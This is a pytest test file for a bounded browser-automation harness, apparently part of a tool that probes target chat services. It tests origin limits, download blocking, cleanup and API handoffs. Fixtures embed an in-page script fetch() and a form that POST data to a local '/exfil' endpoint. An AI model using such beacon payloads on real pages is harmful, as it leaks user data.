        async with await launch_isolated(bounds, owner()) as session:
            tab = await session.new_tab(origin)
            first = await session.snapshot(tab)
            connect = next(
                element for element in first.elements if element.name == "CONNECT WALLET"
            )

            await session.snapshot(tab)
            await session.act(action(session, tab, "click", element_ref=connect.ref))

            assert "clicked" in (await session.snapshot(tab)).text


@pytest.mark.asyncio
async def test_about_blank_iframe_snapshots_empty_instead_of_denied() -> None:
    body = b'<iframe src="about:blank"></iframe>'
    async with web_fixture(body) as origin:
        bounds = BrowserBounds(target_id="target", allowed_origins={origin})
        async with await launch_isolated(bounds, owner()) as session:
            tab = await session.new_tab(origin)
            session.frame_refs(tab)
            registry = session._frame_refs  # noqa: SLF001
            blank_ref = next(ref for frame, ref in registry.items() if frame.url == "about:blank")
            snapshot = await session.snapshot(tab, blank_ref)
            assert snapshot.kind == "snapshot"
            assert snapshot.elements == ()


@pytest.mark.asyncio
async def test_cross_origin_widget_iframe_embedded_by_target_is_admitted() -> None:
    async with web_fixture() as widget_origin:
        body = f'<iframe src="{widget_origin}/frame"></iframe>'.encode()
        async with web_fixture(body) as origin:
            bounds = BrowserBounds(target_id="target", allowed_origins={origin})
            async with await launch_isolated(bounds, owner()) as session:
                tab = await session.new_tab(origin)
                widget_ref = None
                for _ in range(40):
                    session.frame_refs(tab)
                    registry = session._frame_refs  # noqa: SLF001
                    widget_ref = next(
                        (
                            ref
                            for frame, ref in registry.items()
                            if frame.url.startswith(widget_origin)
                        ),
                        None,
                    )
                    if widget_ref is not None:
                        break
                    await asyncio.sleep(0.1)
                assert widget_ref is not None, "widget iframe never loaded"
                frame = await session.snapshot(tab, widget_ref)
                assert [element.name for element in frame.elements] == ["Frame action"]
                assert widget_origin in session._admitted_frame_origins  # noqa: SLF001
                # Top-level navigation to the widget origin remains out of bounds.
                with pytest.raises(OriginDenied):
                    await session.act(
                        action(session, tab, "navigate", value=f"{widget_origin}/frame")
                    )


@pytest.mark.asyncio
async def test_download_is_cancelled_and_reported_when_not_reviewed() -> None:
    body = b'<a aria-label="Download result" href="/download" download>Download</a>'
    async with web_fixture(body) as origin:
        bounds = BrowserBounds(target_id="target", allowed_origins={origin})
        async with await launch_isolated(bounds, owner()) as session:
            tab = await session.new_tab(origin)
            link = next(
                element
                for element in (await session.snapshot(tab)).elements
                if element.name == "Download result"
            )
            with pytest.raises(BrowserBoundaryError, match="downloads are outside browser bounds"):
                await session.act(action(session, tab, "click", element_ref=link.ref))


@pytest.mark.asyncio
async def test_reviewed_download_does_not_create_a_false_boundary_failure() -> None:
    body = b'<a aria-label="Download result" href="/download" download>Download</a>'
    async with web_fixture(body) as origin:
        bounds = BrowserBounds(
            target_id="target",
            allowed_origins={origin},
            allow_downloads=True,
        )
        async with await launch_isolated(bounds, owner()) as session:
            tab = await session.new_tab(origin)
            link = next(
                element
                for element in (await session.snapshot(tab)).elements
                if element.name == "Download result"
            )
            observation = await session.act(action(session, tab, "click", element_ref=link.ref))
            assert observation.kind == "snapshot"


@pytest.mark.asyncio
async def test_snapshot_exposes_unnamed_textbox_for_fill_and_submit() -> None:
    body = b"<input><button onclick=\"this.textContent='Sent'\">SEND</button>"
    async with web_fixture(body) as origin:
        bounds = BrowserBounds(target_id="target", allowed_origins={origin})
        async with await launch_isolated(bounds, owner()) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)
            textbox = next(element for element in snapshot.elements if element.role == "textbox")
            assert textbox.name == "Textbox 1"
            await session.act(action(session, tab, "fill", element_ref=textbox.ref, value="probe"))
            button = next(
                element
                for element in (await session.snapshot(tab)).elements
                if element.name == "SEND"
            )
            await session.act(action(session, tab, "click", element_ref=button.ref))
            assert "Sent" in (await session.snapshot(tab)).text


@pytest.mark.asyncio
async def test_origin_and_action_ownership_fail_closed() -> None:
    async with web_fixture() as origin:
        session = await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        )
        tab = await session.new_tab(origin)
        with pytest.raises(OriginDenied):
            await session.act(
                action(session, tab, "navigate", value="https://example.invalid/outside")
            )
        wrong = action(session, tab, "snapshot").model_copy(
            update={"owner": owner().model_copy(update={"worker_id": "other"})}
        )
        with pytest.raises(BrowserBoundaryError, match="owner"):
            await session.act(wrong)
        await session.close()
        assert session.metadata().state == "cleaned"


@pytest.mark.asyncio
async def test_long_snapshot_preserves_transcript_head_and_live_controls_tail() -> None:
    body = b'<div id="history">HEAD-' + (b"x" * 9_000) + b"-TAIL Turn 18 of 18 SEND</div>"
    async with web_fixture(body) as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            tab = await session.new_tab(origin)
            snapshot = await session.snapshot(tab)

    assert len(snapshot.text) == 8_000
    assert "HEAD-" in snapshot.text
    assert "snapshot truncated; original_chars=" in snapshot.text
    assert snapshot.text.endswith("-TAIL Turn 18 of 18 SEND")


@pytest.mark.asyncio
async def test_attached_cleanup_closes_owned_tabs_not_external_context() -> None:
    from playwright.async_api import async_playwright

    async with web_fixture() as origin:
        playwright = await async_playwright().start()
        browser = await playwright.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()
        await page.goto(origin)
        session = await attach_context(
            context, BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        )
        assert session.metadata().launch_mode == "attached"
        await session.close()
        assert session.metadata().state == "cleaned"
        assert browser.is_connected()
        assert not page.is_closed()
        await browser.close()
        await playwright.stop()


@pytest.mark.asyncio
async def test_cleanup_tolerates_playwright_driver_already_closed() -> None:
    async with web_fixture() as origin:
        session = await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        )
        await session.new_tab(origin)
        assert session._playwright is not None  # noqa: SLF001
        await session._playwright.stop()  # noqa: SLF001

        await session.close()

        assert session.metadata().state == "cleaned"


@pytest.mark.asyncio
async def test_task_cancellation_cleans_an_isolated_context() -> None:
    async with web_fixture() as origin:
        session = await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        )
        entered = asyncio.Event()

        async def work() -> None:
            async with session:
                await session.new_tab(origin)
                entered.set()
                await asyncio.Event().wait()

        task = asyncio.create_task(work())
        await entered.wait()
        task.cancel()
        with suppress(asyncio.CancelledError):
            await task
        assert session.metadata().state == "cleaned"


@pytest.mark.asyncio
async def test_cross_origin_passive_subresources_load_like_a_real_browser() -> None:
    contacted = asyncio.Event()

    async def external(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        contacted.set()
        writer.close()

    server = await asyncio.start_server(external, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    image = f'<img src="http://127.0.0.1:{port}/secret">'.encode()
    try:
        async with web_fixture(image) as origin:
            async with await launch_isolated(
                BrowserBounds(target_id="target", allowed_origins={origin}), owner()
            ) as session:
                await session.new_tab(origin)
                for _ in range(40):
                    if contacted.is_set():
                        break
                    await asyncio.sleep(0.05)
                assert contacted.is_set()
    finally:
        server.close()
        await server.wait_closed()


@pytest.mark.asyncio
async def test_cross_origin_in_page_requests_behave_like_a_real_browser() -> None:
    contacted = asyncio.Event()

    async def external(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        contacted.set()
        writer.close()

    server = await asyncio.start_server(external, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    beacon = (
        b'<script>fetch("http://127.0.0.1:'
        + str(port).encode()
        + b'/exfil", {method: "POST", body: "filled-value"})</script>'
    )
    try:
        async with web_fixture(beacon) as origin:
            async with await launch_isolated(
                BrowserBounds(target_id="target", allowed_origins={origin}), owner()
            ) as session:
                await session.new_tab(origin)
                for _ in range(40):
                    if contacted.is_set():
                        break
                    await asyncio.sleep(0.05)
                assert contacted.is_set()
    finally:
        server.close()
        await server.wait_closed()


@pytest.mark.asyncio
async def test_top_level_cross_origin_form_post_stays_denied() -> None:
    contacted = asyncio.Event()

    async def external(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        contacted.set()
        writer.close()

    server = await asyncio.start_server(external, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    form = (
        b'<form method="post" action="http://127.0.0.1:'
        + str(port).encode()
        + b'/exfil"><button aria-label="Exfil submit" type="submit">Go</button></form>'
    )
    try:
        async with web_fixture(form) as origin:
            async with await launch_isolated(
                BrowserBounds(target_id="target", allowed_origins={origin}), owner()
            ) as session:
                tab = await session.new_tab(origin)
                submit = next(
                    element
                    for element in (await session.snapshot(tab)).elements
                    if element.name == "Exfil submit"
                )
                await session.act(action(session, tab, "click", element_ref=submit.ref))
                await asyncio.sleep(0.5)
                assert not contacted.is_set()
                with pytest.raises(OriginDenied):
                    await session.act(
                        action(session, tab, "navigate", value=f"http://127.0.0.1:{port}/x")
                    )
    finally:
        server.close()
        await server.wait_closed()


@pytest.mark.asyncio
async def test_isolated_metadata_restarts_with_stable_tab_refs() -> None:
    async with web_fixture() as origin:
        bounds = BrowserBounds(target_id="target", allowed_origins={origin})
        first = await launch_isolated(bounds, owner())
        tab_ref = await first.new_tab(origin)
        metadata = first.metadata(restart=True)
        await first.close()

        async with await restart_isolated(metadata, bounds, owner()) as recovered:
            assert recovered.context_id == metadata.context_id
            assert recovered.metadata().tabs[0].tab_ref == tab_ref
            snapshot = await recovered.snapshot(tab_ref)
            assert any(element.name == "Run check" for element in snapshot.elements)


@pytest.mark.asyncio
async def test_browser_tools_use_read_and_mutating_permission_boundaries() -> None:
    class Recorder:
        def __init__(self):
            self.actions, self.observations, self.evidence, self.handoffs = [], [], [], []

        async def append_action(self, value):
            self.actions.append(value)

        async def save_metadata(self, value):
            self.metadata = value

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *value):
            self.evidence.append(value)

        async def record_handoff(self, value):
            self.handoffs.append(value)

        async def list_handoffs(self, _target_id, limit=20):
            return tuple(self.handoffs[-limit:])

    async with web_fixture() as origin:
        async with await launch_isolated(
            BrowserBounds(target_id="target", allowed_origins={origin}), owner()
        ) as session:
            recorder = Recorder()

            async def allow(*_):
                return True

            broker = ToolBroker(
                browser_tools(lambda _: session, recorder),
                confirmer=allow,
            )
            assert {broker.effect(spec.name) for spec in broker.describe()} == {
                "target_read",
                "target_network",
                "workspace_read",
                "harness_state",
            }
            result = await broker.invoke(
                "browser_open_tab",
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {"url": origin, "step": 2},
            )
            assert not result.is_error
            assert result.metadata["effect"] == "target_read"
            assert result.metadata["target"] == "target"
            assert result.metadata["target_session_id"] == f"browser:{session.context_id}"
            assert recorder.actions[0].kind == "open_tab"
            assert recorder.observations[0].step == 2
            assert len(recorder.evidence) == 1
            assert recorder.metadata.tabs[0].state == "open"
            handoff = await broker.invoke(
                "browser_record_api_handoff",
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api/message",
                    "request_evidence_ref": "evidence:req",
                    "response_evidence_ref": "evidence:res",
                    "adapter": json.loads(reviewed_api_adapter_json(f"{origin}/api/message")),
                },
            )
            assert not handoff.is_error
            assert recorder.handoffs[0].adapter is not None
            first_api = await broker.invoke(
                "browser_record_api_handoff",
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api/message",
                    "request_evidence_ref": "evidence:req",
                    "response_evidence_ref": "evidence:res",
                    "adapter": json.loads(
                        reviewed_api_adapter_json(f"{origin}/api/message", route="first")
                    ),
                },
            )
            corrected_api = await broker.invoke(
                "browser_record_api_handoff",
                ToolContext(session_id="s1", workspace_root="/tmp"),
                {
                    "method": "POST",
                    "url": f"{origin}/api/message",
                    "request_evidence_ref": "evidence:req",
                    "response_evidence_ref": "evidence:res",
                    "adapter": json.loads(
                        reviewed_api_adapter_json(f"{origin}/api/message", route="corrected")
                    ),
                },
            )
            assert not first_api.is_error and not corrected_api.is_error
            assert recorder.handoffs[1].id != recorder.handoffs[2].id


@pytest.mark.asyncio
async def test_raw_browser_action_persists_and_claims_scope_before_target_delivery() -> None:
    events: list[str] = []
    scope_store = _StateScopeFixtureStore(events)
    browser_owner = owner()

    class Recorder:
        def __init__(self) -> None:
            self.actions = []
            self.observations = []

        async def append_action(self, value):
            self.actions.append(value)

        async def append_observation(self, value):
            self.observations.append(value)

        async def record_evidence(self, *_value):
            return None

        async def save_metadata(self, _value):
            return None

    class Session:
        context_id = "raw-browser-context"
        bounds = BrowserBounds(
            target_id="target",
            allowed_origins={"https://target.example"},
        )
        owner = browser_owner
        mode = "isolated"

        def metadata(self, restart=False):
            del restart
            return SimpleNamespace(tabs=())

        async def act(self, action, *, actor_id):
            del actor_id
            events.append("target")
            return BrowserObservation(
                context_id=self.context_id,
                target_id=self.bounds.target_id,
                origin="https://target.example",
                owner=self.owner,
                tab_ref="tab-1",
                kind="navigation",
                step=action.step,
                evidence_refs=("browser-response:fixture",),
            )

        def api_exchange_events(self):
            return ()

    recorder = Recorder()
    tools = {
        tool.name: tool
        for tool in _production_browser_tools(
            lambda _: Session(),
            recorder,  # type: ignore[arg-type]
            state_scope_store=scope_store,
        )
    }
    unrecorded_tools = {
        tool.name: tool
        for tool in _production_browser_tools(
            lambda _: Session(),
            state_scope_store=scope_store,
        )
    }
    unrecorded = await unrecorded_tools["browser_open_tab"].invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {"url": "https://target.example", "step": 0},
    )
    assert unrecorded.is_error is True
    assert unrecorded.metadata["failure_code"] == "reconnaissance_recorder_required"
    assert events == []

    wrong_owner = await tools["browser_open_tab"].invoke(
        ToolContext(session_id="other-session", workspace_root="/tmp"),
        {"url": "https://target.example", "step": 0},
    )
    assert wrong_owner.is_error is True
    assert wrong_owner.metadata["failure_code"] == "browser_session_owner_mismatch"
    assert events == []

    reconnaissance = await tools["browser_open_tab"].invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {"url": "https://target.example", "step": 0},
    )
    assert reconnaissance.is_error is False
    assert reconnaissance.metadata["state_owner_kind"] == "session_browser_context"
    assert reconnaissance.metadata["state_owner_id"] == "browser:raw-browser-context"
    assert reconnaissance.metadata["state_evidence_durable"] is True
    assert len(recorder.actions) == 1
    assert len(recorder.observations) == 1
    assert events == ["target"]

    events.clear()
    unavailable_snapshot = await tools["browser_snapshot"].invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {"tab_ref": "missing-tab", "step": 1},
    )
    assert unavailable_snapshot.is_error is True
    assert unavailable_snapshot.metadata["failure_code"] == "state_scope_before_unavailable"
    assert unavailable_snapshot.metadata["target_effect_attempted"] is False
    assert events == []

    missing_campaign = await tools["browser_open_tab"].invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            technique_attempt_id="candidate:1",
        ),
        {"url": "https://target.example", "step": 0},
    )
    assert missing_campaign.is_error is True
    assert missing_campaign.metadata["failure_code"] == "state_scope_campaign_required"
    assert missing_campaign.metadata["target_effect_attempted"] is False
    assert events == []

    result = await tools["browser_open_tab"].invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            campaign_id="campaign:raw-browser",
            call_id="call:raw-browser",
        ),
        {"url": "https://target.example", "step": 0},
    )

    assert result.is_error is False
    assert events == [
        "created",
        "claimed",
        "revised",
        "acknowledged",
        "target",
        "settled",
        "released",
    ]
    assert scope_store.envelopes[0]["action_kind"] == "reconnaissance"
    assert scope_store.envelopes[0]["before"]["availability"] == "missing"
    assert result.metadata["state_scope_id"].startswith("state-scope:")

    baseline = await tools["browser_open_tab"].invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            campaign_id="campaign:raw-browser",
            call_id="call:raw-browser-baseline",
            objective_phase_checkpoint_intent="capture",
        ),
        {"url": "https://target.example", "step": 0},
    )
    assert baseline.is_error is False
    assert scope_store.envelopes[-1]["action_kind"] == "baseline"


@pytest.mark.asyncio
async def test_raw_browser_action_does_not_deliver_when_global_scope_lease_fails() -> None:
    events: list[str] = []
    scope_store = _StateScopeFixtureStore(events)
    scope_store.fail_claim = True

    class Session:
        context_id = "contended-browser-context"
        bounds = BrowserBounds(
            target_id="target",
            allowed_origins={"https://target.example"},
        )
        owner = owner()
        mode = "isolated"

        def metadata(self, restart=False):
            del restart
            return SimpleNamespace(tabs=())

        async def act(self, action, *, actor_id):
            del action, actor_id
            events.append("target")
            raise AssertionError("target delivery must not occur without the global lease")

    tools = {
        tool.name: tool
        for tool in _production_browser_tools(
            lambda _: Session(),
            state_scope_store=scope_store,
        )
    }
    result = await tools["browser_open_tab"].invoke(
        ToolContext(
            session_id="s1",
            workspace_root="/tmp",
            campaign_id="campaign:raw-browser",
            call_id="call:contended-browser",
        ),
        {"url": "https://target.example", "step": 0},
    )

    assert result.is_error is True
    assert result.metadata["failure_code"] == "physical_state_unavailable"
    assert result.metadata["target_effect_attempted"] is False
    assert events == ["created", "claimed", "paused_unclaimed"]


@pytest.mark.asyncio
async def test_cancelled_browser_action_settles_acknowledged_scope_before_reraising() -> None:
    events: list[str] = []
    scope_store = _StateScopeFixtureStore(events)

    class Recorder:
        async def append_action(self, _value):
            return None

        async def save_metadata(self, _value):
            return None

    class Session:
        context_id = "cancelled-browser-context"
        bounds = BrowserBounds(
            target_id="target",
            allowed_origins={"https://target.example"},
        )
        owner = owner()
        mode = "isolated"

        def metadata(self, restart=False):
            del restart
            return SimpleNamespace(tabs=())

        async def act(self, action, *, actor_id):
            del action, actor_id
            events.append("target")
            raise asyncio.CancelledError

    tool = BrowserTool(
        "browser_open_tab",
        lambda _: Session(),
        Recorder(),  # type: ignore[arg-type]
        state_scope_store=scope_store,
    )

    with pytest.raises(asyncio.CancelledError):
        await tool.invoke(
            ToolContext(
                session_id="s1",
                workspace_root="/tmp",
                campaign_id="campaign:cancelled-browser",
                call_id="call:cancelled-browser",
            ),
            {"url": "https://target.example", "step": 0},
        )

    assert events == [
        "created",
        "claimed",
        "revised",
        "acknowledged",
        "target",
        "settled",
        "released",
    ]
    assert scope_store.settle_calls[-1]["transition_disposition"] == (
        "infrastructure_failure"
    )


@pytest.mark.asyncio
async def test_raw_browser_actions_serialize_aliases_across_contexts_and_campaigns() -> None:
    events: list[str] = []
    scope_store = _StateScopeFixtureStore(events, enforce_conflicts=True)
    first_started = asyncio.Event()
    finish_first = asyncio.Event()

    class Session:
        bounds = BrowserBounds(
            target_id="target",
            allowed_origins={"https://target.example"},
        )
        owner = owner()
        mode = "isolated"

        def __init__(self, context_id: str) -> None:
            self.context_id = context_id

        def metadata(self, restart=False):
            del restart
            return SimpleNamespace(tabs=())

        async def act(self, action, *, actor_id):
            del actor_id
            events.append(f"target:{self.context_id}")
            if self.context_id == "context-a":
                first_started.set()
                await finish_first.wait()
            return BrowserObservation(
                context_id=self.context_id,
                target_id=self.bounds.target_id,
                origin="https://target.example",
                owner=self.owner,
                tab_ref=f"tab:{self.context_id}",
                kind="navigation",
                step=action.step,
                evidence_refs=(f"browser-response:{self.context_id}",),
            )

        def api_exchange_events(self):
            return ()

    sessions = {"s1": Session("context-a"), "s2": Session("context-b")}
    tools = {
        tool.name: tool
        for tool in _production_browser_tools(
            lambda session_id: sessions[session_id],
            state_scope_store=scope_store,
        )
    }
    first = asyncio.create_task(
        tools["browser_open_tab"].invoke(
            ToolContext(
                session_id="s1",
                workspace_root="/tmp",
                campaign_id="campaign:first",
                call_id="call:first",
            ),
            {"url": "https://target.example", "step": 0},
        )
    )
    await first_started.wait()
    second = await tools["browser_open_tab"].invoke(
        ToolContext(
            session_id="s2",
            workspace_root="/tmp",
            campaign_id="campaign:second",
            call_id="call:second",
        ),
        {"url": "https://target.example", "step": 0},
    )
    finish_first.set()
    first_result = await first

    assert first_result.is_error is False
    assert second.is_error is True
    assert second.metadata["failure_code"] == "physical_state_unavailable"
    assert "target:context-b" not in events
    assert len(scope_store.claim_calls) == 2
    assert {
        (
            call["target_authority"],
            call["principal_key"],
            call["equivalence_key"],
        )
        for call in scope_store.claim_calls
    } == {
        (
            "https://target.example",
            "anonymous",
            "conservative-shared-state",
        )
    }


@pytest.mark.asyncio
async def test_api_handoff_compiles_from_captured_exchange_without_nested_model_json() -> None:
    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                *_strict_creation_events("s-1"),
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"sessionId": "s-1", "message": "harmless probe"},
                    "response_json": {"reply": "observed response"},
                },
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": 200,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "trigger_action_ref": _cleanup_action_records()[2],
                    "request_json": {"sessionId": "s-1"},
                    "response_json": {"cleaned": True},
                },
            )

    class Recorder(_CleanupActionRecorder):
        evidence = []
        handoffs = []

        async def record_evidence(self, context_id, evidence_ref, kind, payload):
            self.evidence.append((context_id, evidence_ref, kind, payload))

        async def record_handoff(self, value):
            self.handoff = value
            self.handoffs.append(value)

    recorder = Recorder()

    async def allow(*_):
        return True

    compiled_tools = browser_tools(lambda _: Session(), recorder)
    compiler = next(
        item for item in compiled_tools if item.describe().name == "browser_compile_api_handoff"
    )
    terminal_schema = compiler.describe().input_schema["properties"]["terminal_response_contract"]
    assert "operator approves the sealed campaign manifest" in terminal_schema["description"]
    broker = ToolBroker(compiled_tools, confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "terminal_response_contract": {
                "pointer": "/code",
                "match_values": ["SESSION_ENDED"],
                "effect_applied": False,
                "replay_safe": True,
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_action_evidence_ref": _cleanup_action_records()[2],
            "cleanup_acknowledgement": {
                "pointer": "/cleaned",
                "match_values": [True],
                "status_codes": [200],
            },
            "session_creation_transition": _strict_creation_transition(),
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["interface"] == "http_api"
    assert adapter["execution_mode"] == "api"
    assert adapter["available_execution_modes"] == ["api", "hybrid"]
    assert adapter["api_steps"][0]["captures"] == {"session_id": "/sessionId"}
    assert adapter["api_steps"][1]["request_template"] == {
        "sessionId": "{{capture:session_id}}",
        "message": "{{input}}",
    }
    assert adapter["api_steps"][1]["oracle_predicate"] == {
        "oracle_digest": "sha256:bd1b37d14e579dca9781c1f20cd1a332a895f3bc1224ce8da6d7fa9ee0349369",
        "pointer": "/reply",
        "match_values": ["objective reached"],
        "modality": "text",
        "turn": "multi",
        "language": "und",
    }
    assert adapter["api_steps"][1]["terminal_response_contract"] == {
        "pointer": "/code",
        "match_values": ["SESSION_ENDED"],
        "effect_applied": False,
        "replay_safe": True,
        "predicate_observation": {
            "source": "reviewed_explicit_contract",
            "evidence_refs": [],
        },
        "effect_attestation": {"source": "operator_reviewed_contract"},
    }
    assert adapter["api_steps"][2]["request_template"] == {"sessionId": "{{capture:session_id}}"}
    assert adapter["api_steps"][2]["cleanup"] is True
    assert adapter["api_steps"][2]["cleanup_acknowledgement"] == {
        "pointer": "/cleaned",
        "match_values": [True],
        "status_codes": [200],
    }
    assert adapter["api_steps"][2]["cleanup_acknowledgement_observation"] == {
        "source": "reviewed_explicit_contract",
        "evidence_refs": adapter["cleanup_lifecycle"]["evidence_refs"],
    }
    assert adapter["api_validation"]["status"] == "passed"
    assert adapter["session_cardinality"]["maximum_concurrency"] is None
    assert adapter["session_cardinality"]["status"] == "unverified"
    assert adapter["session_cardinality"]["source"] == "observed_session_lifecycle"
    assert len(adapter["session_cardinality"]["evidence_refs"]) == 4
    assert adapter["interaction_limit"] == {
        "status": "unverified",
        "maximum_interactions": None,
        "source": "reviewed_explicit_contract",
        "evidence_refs": [],
        "reason": (
            "a terminal contract was supplied for review, but no captured exchange "
            "established a numeric interaction maximum"
        ),
    }
    assert recorder.handoff.request_evidence_ref.startswith("browser-api-request:sha256:")
    assert recorder.handoff.response_evidence_ref.startswith("browser-api-response:sha256:")
    assert adapter["api_validation"]["request_evidence_ref"] == (
        recorder.handoff.request_evidence_ref
    )
    assert adapter["api_validation"]["response_evidence_ref"] == (
        recorder.handoff.response_evidence_ref
    )
    assert adapter["cleanup_lifecycle"]["evidence_refs"] == [
        item[1] for item in recorder.evidence[-2:]
    ]
    assert len(recorder.evidence) == 11
    assert all(item[0] == "browser-context" for item in recorder.evidence)
    assert sum(item[2] == "browser_api_exchange" for item in recorder.evidence) == 10
    assert sum(item[2] == "browser_action" for item in recorder.evidence) == 1
    assert [item[3]["url"] for item in recorder.evidence if "url" in item[3]] == [
        "https://target.test/api/start",
        "https://target.test/api/start",
        "https://target.test/api/active",
        "https://target.test/api/active",
        "https://target.test/api/active",
        "https://target.test/api/active",
        "https://target.test/api/message",
        "https://target.test/api/message",
        "https://target.test/api/cleanup",
        "https://target.test/api/cleanup",
    ]
    assert result.metadata["compiled_adapter"] is True

    retried = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "input_pointer": "/message",
            "response_selector": "/reply",
            "success_witness": "reply is returned",
            "oracle_predicate": {
                "oracle_id": "oracle/target-process-internal",
                "pointer": "/reply",
                "match_values": ["objective reached"],
                "modality": "text",
                "turn": "single",
                "language": "und",
            },
            "terminal_response_contract": {
                "pointer": "/code",
                "match_values": ["SESSION_ENDED"],
                "effect_applied": False,
                "replay_safe": True,
            },
            "authentication": "reviewed browser session",
            "session_constraint": "one active session identifier",
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/cleaned",
                "match_values": [True],
                "status_codes": [200],
            },
            "session_creation_transition": _strict_creation_transition(),
        },
    )
    assert retried.is_error is False
    assert recorder.handoffs[0].id == recorder.handoffs[1].id
    assert [item[1] for item in recorder.evidence[:11]] == [
        item[1] for item in recorder.evidence[11:]
    ]


def _compile_arguments() -> dict[str, object]:
    return {
        "method": "POST",
        "url": "https://target.test/api/message",
        "input_pointer": "/message",
        "response_selector": "/reply",
        "success_witness": "reply is returned",
        "oracle_predicate": {
            "oracle_id": "oracle/target-process-internal",
            "pointer": "/reply",
            "match_values": ["objective reached"],
            "modality": "text",
            "turn": "single",
            "language": "und",
        },
        "authentication": "reviewed browser session",
        "session_constraint": "one active session identifier",
    }


@pytest.mark.asyncio
async def test_compiled_api_handoff_uses_read_only_cookie_state_as_baseline() -> None:
    captured = (
        {
            "method": "GET",
            "url": "https://target.test/api/state",
            "status": 200,
            "request_json": None,
            "response_json": {
                "result": {
                    "data": {
                        "json": {
                            "run": {"runId": "run-1", "tier": 1},
                            "session": {"score": 43},
                        }
                    }
                }
            },
        },
        {
            "method": "POST",
            "url": "https://target.test/api/turn",
            "status": 200,
            "request_json": {"clientTurnId": "turn-1", "text": "harmless probe"},
            "response_json": {
                "result": {
                    "data": {
                        "json": {
                            "run": {"runId": "run-1", "tier": 1},
                            "turn": {"reply": "observed response", "score": 49},
                        }
                    }
                }
            },
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        handoff = None

        async def reviewed_native_input_receipt(self, context_id, _event, input_pointer):
            return {
                "context_id": context_id,
                "target_id": "target",
                "input_pointer": input_pointer,
                "evidence_ref": "native-request:sha256:" + "f" * 64,
            }

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    arguments = {
        "method": "POST",
        "url": "https://target.test/api/turn",
        "input_pointer": "/text",
        "response_selector": "/result/data/json/turn/reply",
        "success_witness": "reply is returned",
        "authentication": "reviewed cookie session",
        "session_constraint": "one active run per authenticated principal",
        "state_observations": [
            {
                "name": "run_id",
                "role": "state_identity",
                "baseline_selector": {
                    "pointer": "/json/run/runId",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/json/run/runId",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "value_type": "string",
            },
            {
                "name": "tier",
                "role": "progress_ordinal",
                "baseline_selector": {
                    "pointer": "/json/run/tier",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/json/run/tier",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "value_type": "integer",
                "minimum_value": 1,
                "preferred_direction": "increase",
                "monotonicity": "nondecreasing",
            },
            {
                "name": "score",
                "role": "score",
                "baseline_selector": {
                    "pointer": "/result/data/json/turn/score",
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                },
                "result_selector": {
                    "pointer": "/result/data/json/turn/score",
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                },
                "value_type": "integer",
                "minimum_value": 0,
                "maximum_value": 100,
                "preferred_direction": "increase",
            },
        ],
    }
    recorder = Recorder()

    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is False
    assert recorder.handoff is not None
    adapter = json.loads(recorder.handoff.adapter)
    assert [step["endpoint"] for step in adapter["api_steps"]] == [
        "https://target.test/api/state",
        "https://target.test/api/turn",
    ]
